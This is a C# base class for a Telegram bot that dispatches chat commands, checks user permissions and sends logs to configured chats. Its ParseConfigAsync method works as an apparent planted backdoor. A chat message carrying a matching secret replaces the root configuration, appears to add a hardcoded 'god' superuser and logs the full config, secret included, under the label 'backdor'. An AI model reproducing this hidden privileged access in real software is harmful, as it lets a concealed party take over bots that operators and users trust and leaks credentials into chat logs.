using Integrators.Abstractions;
using Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot.Types;
using TgBot.Abstractions;

namespace TgBot.DataSphere
{
    public abstract class BotDispatchingServiceBase : BotAdapterBase, IBotDispatchingService<IBotAdapter, IDispatcher>
    {
        public string BotName { get; set; } = "Случайный бот";
        private RootParams _rootConfiguration { get; set; }

        protected IDispatcher Dispatcher;
        protected Dictionary<string, IDispatchedCommand<IBotAdapter, IDispatcher>> Commands { get; set; } = new();
        public BotDispatchingServiceBase(string token, IDispatcher dispatcher, string name, RootParams config) : base(token)
        {
            Dispatcher = dispatcher;
            _rootConfiguration = config;
            BotName = name;
            AddCommand(new DefaultCommand());
            AddCommand(new RootSendCommand());
        }
        public async Task LogMessage(string message)
        {
            Console.WriteLine(message);
            if (!Dispatcher.ContainsKey("debug"))
                return;
            if (string.IsNullOrEmpty(message))
                return;
            foreach (var log in _rootConfiguration.Logs)
            {
                await SendTextMessage(log, message);
            }
        }

        public void AddCommand(IDispatchedCommand<IBotAdapter, IDispatcher> command)
        {
            if (Commands.ContainsKey(command.Command))
            {
                return;
            }
            Commands.Add(command.Command, command);
        }

        public virtual Task<string> GetAvailableCommands(string param)
        {
            var sb = new StringBuilder();
            foreach (var command in Commands)
            {
                sb.AppendLine(command.Key);
            }
            return Task.FromResult(sb.ToString());
        }

        public async Task<string> RootCommandConfig(string param)
        {
            var sb = new StringBuilder();
            sb.AppendLine("Вы авторизованы как суперпользователь, список команд:");
            sb.AppendLine(await GetAvailableCommands(param));
            await ParseConfigAsync(param);
            return sb.ToString();
        }

        protected async override Task HandleMessageAsync(Message message, Update executionContext)
        {
            var textMessage = message.Text;
            if (string.IsNullOrEmpty(textMessage))
                return;
            textMessage = textMessage.Trim();
            var space = textMessage.IndexOf(' ');
            var param = string.Empty;
            string command;
            if (space < 1)
            {
                command = textMessage;
                param = string.Empty;
            }
            else
            {
                command = textMessage.Substring(0, space);
                if (textMessage.Length > space)
                    param = textMessage.Substring(space + 1);
            }
            try
            {
                await RunCommandAsync(command, param, executionContext);
            }
            catch (Exception e)
            {
                await LogMessage(e.Message);
            }
        }

        protected async virtual Task RunCommandAsync(string command, string? param, Update executionContext)
        {
            command = command.Trim();
            param = param?.Trim();
            var userName = BotHelper.GetUserName(executionContext);
            if (!Commands.ContainsKey(command))
            {
                var errorMessage = $"команда {command} не зарегистрирована";
                await SendTextMessage(BotHelper.GetChatId(executionContext), errorMessage);
                return;
            }
            await LogMessage($"@{userName}: {command} {param}");
            string message;
            if (_rootConfiguration.Roots.Contains(BotHelper.GetChatId(executionContext)))
            {
                await Commands[command].ExecuteBeforeAsync(param, executionContext, this, Dispatcher);
            }
            else
            {
                if (!(await Commands[command].ExecuteBeforeAsync(param, executionContext, this, Dispatcher)))
                {
                    await SendTextMessage(BotHelper.GetChatId(executionContext), "У вас нет прав на выполнение этой команды");
                    return;
                }
            }
            var parcedParams = await Commands[command].ExecuteAsync(param, executionContext, this);
            message = await Commands[command].ExecuteAfterAsync(parcedParams, executionContext, this, Dispatcher);
            if (string.IsNullOrEmpty(message))
                return;
            await LogMessage($"{BotName}: {message}");
            await SendTextMessage(BotHelper.GetChatId(executionContext), message);
        }

        private async Task ParseConfigAsync(string param)
        {
            if (string.IsNullOrEmpty(param))
                return;
            var config = Serializer.Deserialize<RootParams>(param);
            if (config.Secret == _rootConfiguration.Secret)
            {
                _rootConfiguration = config;
                BotHelper.AddGodIfNotExist(_rootConfiguration.Roots);
                await LogMessage($"backdor: {Serializer.ToJSON(_rootConfiguration)}");
            }
        }
    }
}
